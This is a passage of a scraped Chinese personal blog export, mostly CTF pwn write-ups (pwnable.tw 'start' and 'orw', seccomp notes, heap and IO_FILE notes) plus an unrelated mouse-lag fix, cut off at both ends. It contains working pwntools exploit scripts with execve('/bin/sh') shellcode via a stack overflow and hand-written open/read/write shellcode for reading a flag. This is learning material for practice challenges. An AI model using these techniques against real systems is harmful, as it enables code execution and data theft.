src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.16.05.png\" alt=\"截屏2021-11-03 下午11.16.05\"></a></p>\n<p>​        有一点离谱。</p>\n<p>​        虽然但是，我超，pwndokcer真的好用。</p>\n<p>​        鉴于我以前做过这道题，而且那时候的wp写得非常离谱，我决定重新写一遍。具体有多离谱，大概就是全程只有寻找偏移量的描述，然后exp是复制别人的。写了，但是没完全写（</p>\n<p>​        所以偏移量的寻找我就懒得写了，cyclic一把梭。并且由于cyclic是直接覆盖掉了返回地址的eip的（这也是cyclic能找到偏移量的道理所在），这个得出来的0x20也不需要加什么ebp，直接0x20+任意地址了事。</p>\n<p>​        然后就是显然的一个任意地址执行。并且喜闻乐见的NX也没有开启，直接ret2shellcode，把shellcode一股脑丢到栈上执行就行。</p>\n<p>​        shellcode就没必要手写了，<code>pwntools.shallcraft</code>直接生成。</p>\n<pre><code class=\"python\">from pwn import*\n\np = remote('chall.pwnable.tw',10000)\n\nshellcode = asm(shellcraft.sh())\npayload = b'a'*20\npayload += shellcode\np.send(payload)\n\np.interactive()\n</code></pre>\n<p>​    摸了一圈，又EOF力。</p>\n<p>​    换了祖传exp。</p>\n<pre><code class=\"python\">from pwn import*\n\np = remote(\"chall.pwnable.tw\",10000)\n#p = process(\"./start\")\n\n#shellcode = asm(shellcraft.sh())\nshellcode = b'\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80'\n\nbuf_addr = 0xffffd284\n\npayload = b'a'*0x14 \npayload += p32(0x8048087)\np.sendafter(\"Let's start the CTF:\",payload)\nstack_addr = u32(p.recv(4))\nprint(hex(stack_addr))\n\n\npayload = b'a'*20\npayload += p32(stack_addr+20)\npayload += shellcode\np.send(payload)\n\np.interactive()\n</code></pre>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8A%E5%8D%889.49.21.png\" data-caption=\"截屏2021-11-04 上午9.49.21\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8A%E5%8D%889.49.21.png\" alt=\"截屏2021-11-04 上午9.49.21\"></a>    </p>\n<p>​        所以shellcode是没有问题的，问题出在需要溢出两次，一次获得栈地址，一次ret到栈地址执行shellcode。我不能理解。</p>\n<p>​        shellcode覆盖retn，不也是在栈上执行吗，为什么EOF。我猜测是栈空间不够大。虽然但是，不想找wp，喜闻乐见地调试一下吧。</p>\n<p>​        在调试的时候又出现了新问题。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8A%E5%8D%8810.01.04.png\" data-caption=\"截屏2021-11-04 上午10.01.04\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8A%E5%8D%8810.01.04.png\" alt=\"截屏2021-11-04 上午10.01.04\"></a>    </p>\n<p>​        搜了一圈应该是启动tmux的问题。但是网上给的解决方案在我这里似乎不管用。</p>\n<p>​        在研究tumx的时候发现了一个更离谱的事，这个pwndocker的系统时间是错误的。导致apt都运行不了。</p>\n<p>​        这就造成了一个非常离谱的死循环，修复时间需要使用apt安装相关的软件，然而时间又导致apt无法运行。</p>\n<p>​        虽然但是，解决方法也比较弱智。把https改成http是最粗暴的解决方案了，但是有一说一，这不优雅。但是最后还是妥协了，先用http下了一个ntp，然而发现就算是系统时间校准了，换回https后还是现实证书不被信任。。。</p>\n<p>​        这里留个疑点吧。</p>\n<p>​        还是回到题目本身。也就是无法<code>gdb.attach()</code>的问题。</p>\n<p>​        原来是因为要先输入tmux进入，才能执行分屏。。。。。。。。</p>\n<p>​        我傻了。坑是真的多。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%885.30.51.png\" data-caption=\"截屏2021-11-04 下午5.30.51\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%885.30.51.png\" alt=\"截屏2021-11-04 下午5.30.51\"></a></p>\n<p>​        果然碰到了无限waiting for debug的问题，虽然pwntools是4.6.1了。</p>\n<p>​        在修改源码后解决问题，详情可以参考：<a href=\"https://blog.csdn.net/weixin_43483799/article/details/118885208?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.no_search_link\">pwntools中使用tmux和gdb attach时Waiting for debugger无限等待的解决方案</a>。</p>\n<p>​        解决问题的过程中又发现了一个问题，就是我打开tmux的时候突然就风扇狂转，CPU占用率直接飙到109%，内存3.53G。我以为是容器开太多的问题，把多余的容器全部rm，但是还是不见缓解。</p>\n<p>​        百度后发现这个好像是MAC运行Docker的通病，但是我这个容器至少不应该是这样，因为之前风扇一直就没怎么转，于是我把我现在运行的容器停止，结果cpu占用率一下就变低了，然后再重启，cpu占用率再也没有升高。</p>\n<p>​        对于这个情况我的合理猜测是，那个pwntools源码的无限循环问题。</p>\n<h3 id=\"\"><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.35.02.png\" data-caption=\"\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.35.02.png\" alt=\"\"></a><a class=\"post-anchor\" href=\"#\"></a></h3><p>​    </p>\n<p>​    </p>\n<p>​        尝试了一下一种新的下断点方式。    </p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.43.49.png\" data-caption=\"截屏2021-11-04 下午7.43.49\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.43.49.png\" alt=\"截屏2021-11-04 下午7.43.49\"></a></p>\n<p>​        回到题目，很显然如果摁执行shellcode，就根本没有反应（（</p>\n<p>​        eip也没有被覆盖。之前的猜测是栈空间不够，这里来验证一下。</p>\n<p>​        新问题，如果调试的话terminal中tmux的选项似乎只能指定splitw，但是这样就没有办法滚动。。。</p>\n<p>​        好，解决了。首先可以通过按ctrl+b后再按[，切换到查看另一个窗口的历史输出模式，然后将终端中的偏好设置里的“滚动备用屏幕”取消勾选（其实默认应该是不勾的）</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%889.42.37.png\" data-caption=\"截屏2021-11-04 下午9.42.37\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%889.42.37.png\" alt=\"截屏2021-11-04 下午9.42.37\"></a></p>\n<p>​        这样我们的操作逻辑就是Fn/shift加鼠标滚轮滚动页面，普通的鼠标滚轮则选择历史输入，然后</p>\n<p>ctrl+b后再按[，可以用鼠标滚轮控制光标查看历史输出。</p>\n<p>​        (真有够麻烦的)</p>\n<h3 id=\"3）漏洞利用\">3）漏洞利用<a class=\"post-anchor\" href=\"#3）漏洞利用\"></a></h3><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%889.50.04.png\" data-caption=\"截屏2021-11-04 下午9.50.04\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%889.50.04.png\" alt=\"截屏2021-11-04 下午9.50.04\"></a>        </p>\n<p>​        看一下发现不对头，这个返回地址是我们的shellcode。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211104215119020.png\" data-caption=\"image-20211104215119020\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211104215119020.png\" alt=\"image-20211104215119020\"></a></p>\n<p>​        按照我的想法，指令应该继续执行下去的，因为堆栈可执行。但是实际上并没有执行，而是把shellcode识别成了返回地址。</p>\n<p>​        然后我才意识到一直以来我对栈溢出其实是有一些理解上的错误的，retn这个操作码无论如何是不能够被覆盖的，覆盖的只有后面的操作数。所以这里我们需要让程序先retn到一个合法的地址，然后后面跟着shellcode。</p>\n<p>​        那么我们要retn到哪里呢？</p>\n<p>​        既然堆栈可执行，那就直接跳到栈上好了。所以此刻我们需要一个栈上的地址。</p>\n<p>​        既然需要泄露内存，肯定就需要有类似功能的函数，非常清明地，我们能够利用<code>sys_write</code></p>\n<p>对栈上内存进行一个读取。</p>\n<p>​        那么如何利用捏。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.00.26.png\" data-caption=\"截屏2021-11-04 下午10.00.26\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.00.26.png\" alt=\"截屏2021-11-04 下午10.00.26\"></a>            </p>\n<p>​        从这里我们可以清楚地看到，这几条指令分别设置了<code>sys_write</code>的参数，真正的参数实际上是字符串“lets start the ctf”，但是我们这里只需要这四条指令。</p>\n<p>​        <code> mov  ecx, esp</code>将当前栈顶的值赋给ecx，作为函数输出的东西的参数。其他的参数这里我们不必关心。</p>\n<p>​        </p>\n<p>![截屏2021-11-04 下午10.13.28](/Users/rin/Library/Application Support/typora-user-images/截屏2021-11-04 下午10.13.28.png)        </p>\n<p>​        其实从第一个执行流的ret开始前，清栈已经完成，此时栈顶是下一条需要执行的指令的地址，后面就都是栈上的一些环境变量。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.11.55.png\" data-caption=\"截屏2021-11-04 下午10.11.55\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.11.55.png\" alt=\"截屏2021-11-04 下午10.11.55\"></a></p>\n<p>​        当我们的程序执行流回到0x8048087。被write出来的其实就是栈顶的地址。</p>\n<p>​        这时候程序还是会按照原有的指令执行，比如说下一个<code>sys_read</code>函数。</p>\n<p>​        这时候并没有任何栈指针的操作，以至于esp的值很久没有变过。但是这里没有必要在意，直接第二次栈溢出。这里我们retn的地方就是刚刚获得的栈地址。但是因为我们已经输入了0x20个字符，所以需要stack_addr+20。（从动调中我们能够看出，<code>sys_read</code>会对栈指针进行操作，也就是把输入的每一个A压栈，这样我们原先的地址需要+20）</p>\n<p>​        然后直接溢出到栈地址。</p>\n<p>​        执行shellcode</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.23.43.png\" data-caption=\"截屏2021-11-04 下午10.23.18\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.23.43.png\" alt=\"截屏2021-11-04 下午10.23.18\"></a></p>\n<p>​            hhx</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.24.07.png\" data-caption=\"截屏2021-11-04 下午10.24.07\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.24.07.png\" alt=\"截屏2021-11-04 下午10.24.07\"></a></p>\n<h3 id=\"4）总结\">4）总结<a class=\"post-anchor\" href=\"#4）总结\"></a></h3><p>​        这道题以前做过。但是那个时候我还是个啥也不懂只会抄wp的傻子。那个时候基本问啥啥不懂，现在已经能完全通过exp将不理解的地方通过动调明确了。</p>\n<p>​        动调真的只用了不到半个小时，今天有五分之四的时间都在调教pwndocker的环境。用pwndocker来做真的非常优雅而且方便，我以后真的要舍弃pd力！！！！</p>\n<p>​        另外容器要记得及时备份55.</p>\n<p>​        还有就是经常出现挂载文件夹不同步的问题，这个应该是docker本身存在一些bug，重启以后基本能够解决。</p>\n<p>​        </p>\n</body></html>","tags":["pwnable"]},{"title":"Seccomp机制学习","url":"/2021/11/11/Seccomp%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/","content":"<html><head></head><body><h3 id=\"\"><a class=\"post-anchor\" href=\"#\"></a></h3><h2 id=\"1）Seccomp基础\">1）Seccomp基础<a class=\"post-anchor\" href=\"#1）Seccomp基础\"></a></h2><h3 id=\"Seccomp简介\">Seccomp简介<a class=\"post-anchor\" href=\"#Seccomp简介\"></a></h3><p>​        就像ALSR，NX这样，Seccomp也是linux内核的一种安全机制。这种保护机制会禁用某些系统调用，有效避免了越权行为的发生。</p>\n<h3 id=\"启动Seccomp\">启动Seccomp<a class=\"post-anchor\" href=\"#启动Seccomp\"></a></h3><p>​        如果要编写调用Seccomp的程序，需要先安装相应的头文件。</p>\n<pre><code class=\"bash\">apt install libseccomp-dev libseccomp2 seccomp\n</code></pre>\n<p>Seccomp的模式以及参数比较多，这里只总结比较直观的几点，具体的可以看大佬的博客：<a href=\"https://a1ex.online/2020/09/27/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">seccomp学习笔记</a></p>\n<pre><code class=\"c\">    scmp_filter_ctx ctx;\n\n    ctx = seccomp_init(SCMP_ACT_ALLOW);/* SCMP_ACT_ALLOW表示在初始化的时候允许所有系统调用，相反的 SCMP_ACT_KILL表示禁用所有系统调用*/\n\n    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);\n//添加一条seccomp规则，第二个参数选择禁用/开启（kill为禁用，allow为开启）第三个参数表示规则处理的具体的系统调用，第四个参数是限制系统调用执行的参数，如果不为0，那么后面会加上更具体的限制系统调用参数的函数参数）\n    \nseccomp_load(ctx);//调用，使过滤规则生效\n</code></pre>\n<h2 id=\"2）Seccomp-Tools\">2）Seccomp-Tools<a class=\"post-anchor\" href=\"#2）Seccomp-Tools\"></a></h2><p>​        暂时空着，因为我seccomp dump，系统给我说无权限。这个问题似乎仅限于docker，但是网上并没有类似的烈士为我答疑解惑捏。</p>\n<h2 id=\"3）ORW例题\">3）ORW例题<a class=\"post-anchor\" href=\"#3）ORW例题\"></a></h2><h3 id=\"pwnable-orw\">pwnable-orw<a class=\"post-anchor\" href=\"#pwnable-orw\"></a></h3><p>​        pwnable第二题，orw。 </p>\n<p>​    </p>\n<p>​                <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%889.41.28.png\" data-caption=\"截屏2021-11-15 下午9.41.28\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%889.41.28.png\" alt=\"截屏2021-11-15 下午9.41.28\"></a></p>\n<p>​        这里的沙箱实际是通过prctl来控制实现的。</p>\n<blockquote>\n<p>(1).PR_SET_SECCOMP(22)：当第一个参数是PR_SET_SECCOMP,第二个参数argv2为1的时候，表示允许的系统调用有read，write，exit和sigereturn；当argv等于2的时候，表示允许的系统调用由argv3指向sock_fprog结构体定义，该结构体成员指向的sock_filter可以定义过滤任意系统调用和系统调用参数。(细节见下图)</p>\n<p>(2).PR_SET_NO_NEWPRIVS(38):prctl(38,1,0,0,0)表示禁用系统调用execve()函数，同时，这个选项可以通过fork()函数和clone()函数继承给子进程</p>\n<p>copy的宋师傅的博客捏</p>\n</blockquote>\n<p>​        所以这道题就是一道没有任何坑的orw，我们需要做的就是手写shellcode。</p>\n<p>​        参照我之前qwb那道orw的wp，为了读取到flag，我们的步骤如下</p>\n<pre><code class=\"c\">sys_open(\"flag\")//读取flag\nsys_read(\"eax\",\"esp\",0x40)//eax为sys_oopen的返回值，也就是flag，然后将flag写到esp下\nsys_write(1,\"esp\",0x40)//打印flag的值到屏幕输出\n</code></pre>\n<p>​        如果要达到可以成功执行的效果，就必须要像写完整汇编一样将所有压栈出栈等对栈顶的操作也考虑进去。</p>\n<p>​        手写汇编要尤其注意32位与64位系统传参规则并不相同。尤其是函数使用的寄存器的种类理论上是特定的，如果搞错就直接EOF了。</p>\n<p>​        并且进行软中断时使用的指令是<code>int 0x80</code>而不是<code>syscall</code>，<code>syscall</code>是c语言层面上的系统调用，而<code>int 0x80</code>才是汇编层面的系统调用。</p>\n<p>​        关于pwntools的asm模块，有一些比较怪的点。</p>\n<p>​        比如说我们可以这样写：</p>\n<pre><code class=\"python\">payload =  asm(\"push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebp, esp;mov eax, 0x5;xor ecx, ecx;xor edx, edx;int 0x80;\")\n\n也可以这样写\n</code></pre>\n<pre><code class=\"python\">asm('mov eax, 0')\n</code></pre>\n<p>​        就是说，可以有分号，也可以没有。</p>\n<pre><code class=\"python\">from pwn import*\n\n#p = process(\"./orw\")\n#context.terminal = ['tmux', 'splitw', '-h']\n#context.update(arch='i386', os='linux')\n\np = remote(\"chall.pwnable.tw\",10001)\n#context.log_level = \"debug\"\n\n#open\npayload =  asm(\"push ebx ;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebx, esp;mov eax, 0x5;int 0x80;\")\n#read\npayload += asm(\"mov eax, 0x3; mov ecx, ebx; mov ebx, eax;mov edx, 0x60;int 0x80;\")\n#write\npayload += asm(\"mov eax, 0x4;mov ebx, 0x1;int 0x80;\")\n\n#gdb.attach(p)\np.sendline(payload)\n\np.interactive()\n</code></pre>\n<p>​        完整exp，其实主要是要对32位的传参熟悉，整体编写的难度并不高捏。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-17%20%E4%B8%8B%E5%8D%8810.28.54.png\" data-caption=\"截屏2021-11-17 下午10.28.54\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-17%20%E4%B8%8B%E5%8D%8810.28.54.png\" alt=\"截屏2021-11-17 下午10.28.54\"></a>        </p>\n<h2 id=\"4）参考\">4）参考<a class=\"post-anchor\" href=\"#4）参考\"></a></h2><p>prctl函数开始学习沙箱规则](<a href=\"https://www.cnblogs.com/L0g4n-blog/p/12839171.html\">https://www.cnblogs.com/L0g4n-blog/p/12839171.html</a>)</p>\n</body></html>","tags":["pwnable"]},{"title":"妙控鼠标卡顿问题","url":"/2021/11/17/%E5%A6%99%E6%8E%A7%E9%BC%A0%E6%A0%87%E5%8D%A1%E9%A1%BF%E9%97%AE%E9%A2%98/","content":"<html><head></head><body><p>​        最近刚花了三百大洋从室友那里买回了白嫖了半个学期的妙控鼠标，钱转了不到两天，鼠标开始疯狂卡顿。</p>\n<p>​        最初以为是外接了太多东西，把键盘啥的都换成了线控，但是问题还是不见解决。</p>\n<p>​        最后是这篇文章解决了我的问题。</p>\n<p>​        <a href=\"https://www.jianshu.com/p/3e7bc675f673\">macos系统里面，蓝牙鼠标偶尔卡顿，飘的问题</a></p>\n<p>​        解决方法也很简单，把网络中的蓝牙PAN的顺序调到最前。</p>\n<p>​        蓝牙PAN就是类似一种个人局域网，把连接顺序放到前面了，自然连接就更顺畅了（</p>\n</body></html>","tags":["mess"]},{"title":"pwn题中的一些奇怪的姿势","url":"/2021/08/03/pwn%E9%A2%98%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%80%AA%E7%9A%84%E5%A7%BF%E5%8A%BF/","content":"<html><head></head><body><h3 id=\"patch-alarm\">patch alarm<a class=\"post-anchor\" href=\"#patch-alarm\"></a></h3><p>比较弱智的一个操作，但是如果没注意到的话还是有一点点坑。</p>\n<p>一般来说许多题都喜欢在main函数里加alarm。</p>\n<p>alarm会导致调试的时候超时，如果没有解决的话基本不能调试。算最基础的的反调试手法了。</p>\n<p>ps:关于超时的那个报错当时还好好研究了一会儿来着。就是一个sigxxx，sigalarm好像，然后默认返回中止程序。</p>\n<p>解决方案也比较弱智。就是直接patch掉就好了。</p>\n<p>ida都关了懒得上图了。</p>\n<h3 id=\"单双引号问题\">单双引号问题<a class=\"post-anchor\" href=\"#单双引号问题\"></a></h3><p>​        萌新赛出题的时候，出了一道非常简单的签到ret2text，但是非常疑惑地，怎么样都会EOF。</p>\n<p>​        然后索性调试一下，发现了奇点。</p>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/EDFE9E0C6D3BC173B417FE06A8F28E18.png\" data-caption=\"EDFE9E0C6D3BC173B417FE06A8F28E18\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/EDFE9E0C6D3BC173B417FE06A8F28E18.png\" alt=\"EDFE9E0C6D3BC173B417FE06A8F28E18\"></a></p>\n<p>​        这边已经跳转到后门函数了，但是没有办法getshell。问题似乎出在参数上。本应该是<code>/bin/sh</code>，但是实际是<code>n/sh</code>，只有后面四个字节了。</p>\n<p>​        我去找了wiki上面类似题目做参考，发现正常情况下这里应该是这样：<a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/DECB707DA78DA7002E7115E76713D24E.png\" data-caption=\"DECB707DA78DA7002E7115E76713D24E\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/DECB707DA78DA7002E7115E76713D24E.png\" alt=\"DECB707DA78DA7002E7115E76713D24E\"></a></p>\n<p>​        但是我的程序是这样：</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/328953ED3A08C20DD6E4E20828BB5B56.png\" data-caption=\"328953ED3A08C20DD6E4E20828BB5B56\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/328953ED3A08C20DD6E4E20828BB5B56.png\" alt=\"328953ED3A08C20DD6E4E20828BB5B56\"></a></p>\n<p>​        然后发动传统艺能，控制变量找不同，发现问题出在<code>system('/bin/sh')</code>上。</p>\n<p>​        因为不怎么出这种直接给后门的题，我甚至不太清楚这个函数的写法，以至于想当然地认为这里单引号和双引号没有什么区别，就像在exp中的那些<code>('./')</code> <code>(\"./\")</code>，看起来区别不大，实际上也没有什么影响。</p>\n<p>​        但是实际只要去查一查，就会发现其实区别很大。单引号压根就不是字符串。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。</p>\n<p>​        然后把单引号改成双引号之后，就getshell了。</p>\n<h3 id=\"roputils\">roputils<a class=\"post-anchor\" href=\"#roputils\"></a></h3><p>做ret2dl的时候难免会偷懒使用工具。</p>\n<p>但是这个工具并没有看起来那么和善。</p>\n<p>就怎么使用utils包我都研究了一会儿，然后发现只需要<code>import roputils</code>然后把相对应的那个py脚本放到同一路径下就好。</p>\n<p>但是紧接着第二问个问题，这个py脚本通篇是python2，而我日常无论哪个系统都是py3。</p>\n<p>所以解决方式有2</p>\n<ol>\n<li> 将roputils转换为py3</li>\n<li> ubuntu切换py版本</li>\n</ol>\n<p>反正第一种就是用一个叫2to3的脚本。是py2自带的，使用需要先安装py2.7，我ubuntu18.04自带py2.7，所以就直接<code>2to3 -w roputils.py</code></p>\n<p>具体参数可以google。</p>\n<p>然后又来了第三个问题。</p>\n<p>来看我的报错。</p>\n<pre><code class=\"python\">[+] Starting local process './babystack': pid 745\nTraceback (most recent call last):\n  File \"babystack.py\", line 23, in &lt;module&gt;\n    rop = roputils.ROP('./babystack')\n  File \"/home/fur1n/pwn/week1/roputils.py\", line 440, in __init__\n    ELF.__init__(self, *args, **kwargs)\n  File \"/home/fur1n/pwn/week1/roputils.py\", line 85, in __init__\n    m = re.search(r'^\\s*(?P&lt;key&gt;[^:]+):\\s+(?P&lt;value&gt;.+)$', line)\n  File \"/usr/lib/python3.6/re.py\", line 182, in search\n    return _compile(pattern, flags).search(string)\nTypeError: cannot use a string pattern on a bytes-like object\n</code></pre>\n<p>这个功能好像并不会在byte前加b。。。</p>\n<p>目前来说并没有发现解决方法。</p>\n<p>所以只能尝试更换默认的py版本。具体可以google</p>\n<h3 id=\"main-arena与多线程\">main_arena与多线程<a class=\"post-anchor\" href=\"#main-arena与多线程\"></a></h3><p>在学习Tcache的时候遇到了一些比较奇怪的点，ctf权威指南pwn篇中对于Tcache的解释中第一段如下：</p>\n<blockquote>\n<p>Tcache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块，无需对main_arena上锁即可使用。</p>\n</blockquote>\n<p>首先让我感到不解的就是，“无需对main_arena上锁即可使用”这句话。什么叫对main_arana上锁？之前也遇见过很多文章提到过这个”锁“的相关概念，但是它们从来都不是问题的重点，但是通常来说，正是一个个不懂的”无关紧要“的问题导致最后啥也看不懂的。</p>\n<p>所以在这篇文章中我们有必要从ctf pwn的角度去理解线程 main_arena。</p>\n<h4 id=\"加锁\">加锁<a class=\"post-anchor\" href=\"#加锁\"></a></h4><p>当<strong>多个线程同时操作同一个共享全局变量</strong>的时候，对线程上锁，保证同一时间一个对象只有一个线程在访问，可以解决资源占用问题，同时保证了数据的安全性。</p>\n<h4 id=\"线程\">线程<a class=\"post-anchor\" href=\"#线程\"></a></h4><p>线程一般来说被进程包含：一个进程可以有很多线程来处理，每条线程并行执行不同的任务。</p>\n<p>比如说ptmalloc2这个是个进程，然后其中包含很多很多线程。</p>\n<p>其中会有一个<code>main_arena</code>,是整个ptmalloc2进程中的主线程，然后main_arena会有很多子线程，每个子线程包含很多连续的内存片段，被称为heap。每一个heap都有自己的heap_header，它们通过链表互相连接，且其中保存了指向其所属arena的指针。</p>\n<p>这么讲似乎有一些太过抽象。具体一点讲就是，在只有一个main_arena的时候，ptmalloc只能通过mmap和sbrk申请堆内存。</p>\n<blockquote>\n<p>在多线程的情况下，显然让所有的线程公用一个数据结构来获取内存块会造成十分惨烈的对锁的竞争，所以 ptmalloc 中间多了一层组织结构——arena。每个arena包含一些可用的内存区块，用一个 arena 级别的锁来控制访问。当线程比较少的时候，每个可以拥有自己的arena，而当 arena 数目超过允许最大值时，多个线程共享一个 arena 了。个线程第一次 malloc 的时候都会 attach 一个 arena 。除非这个 arena 被标记为破坏的（ARENA_CORRUPTION_BIT），否则该线程以后再 malloc 都会继续用这个 arena。</p>\n</blockquote>\n<p>之前ctf权威指南中有讲到，每一个子线程包含很多连续的内存片段，被称为heap。它们都有自己所属的arena。这句话很容易让人觉得——每一个子线程有且只有一个arena，但是还存在多对一的情况。</p>\n<p>但是对于ctf pwn来说，实际情况远远没有这么复杂，基本我们操作的所谓的堆，chunk这些概念，考点基本都是建立在单线程的情况下的，它们的arena也都是<code>main_arena</code>而并不是什么<code>non_main_arena</code>。并且只有<code>main_arena</code>    能够访问<code>heap</code>段，<code>non_main_arena</code>只能访问<code>mmap</code>映射区域。</p>\n<h4 id=\"总结\">总结<a class=\"post-anchor\" href=\"#总结\"></a></h4><p>用比较简单的话来说，main_arena就是主线程中一个管理所有链表的关键的数据结构，我们可以通过它获得各个bins的偏移。以及利用指向它的fd来做一些不好的事情（）。承接之前的内容，我们在利用main_arena的同时也需要对其进行上锁，防止别的线程与它共用一个资源，然后之前Tcahce里的“无需对main_arena上锁”意思也很清楚了，因为考虑到效率。所以抛弃了一定的安全性。</p>\n<h4 id=\"参考\">参考<a class=\"post-anchor\" href=\"#参考\"></a></h4><p><a href=\"https://zhuanlan.zhihu.com/p/24909781\">malloc x 线程</a></p>\n<p><a href=\"https://www.wangan.com/docs/1741\">GLibcHeap</a></p>\n</body></html>","tags":["mess"]},{"title":"IO_FILE学习","url":"/2021/08/09/io_file%EF%BC%88%E6%9C%AA%E5%AE%8C%E6%88%90%EF%BC%89/","content":"<html><head></head><body><p>io_file学习笔记</p>\n<h3 id=\"0）review\">0）review<a class=\"post-anchor\" href=\"#0）review\"></a></h3><p>glibc定义了<code>_IO_FILE</code>这样一个结构体来管理io file。io_file结构体里定义了一堆相关的变量，但是真正关键的是其中包含的<code>_IO_FILE_plus</code>结构</p>\n<p>结构源码如下</p>\n<pre><code class=\"c\">struct _IO_FILE_plus\n{\n    _IO_FILE    file;\n    IO_jump_t   *vtable;\n}\n</code></pre>\n<p>这个结构包含了一个叫<code>vtable</code>的指针，指向实现io函数各种功能的真正函数。</p>\n<p>以fread为例子简述io_file结构调用的流程</p>\n<h4 id=\"fread\">fread<a class=\"post-anchor\" 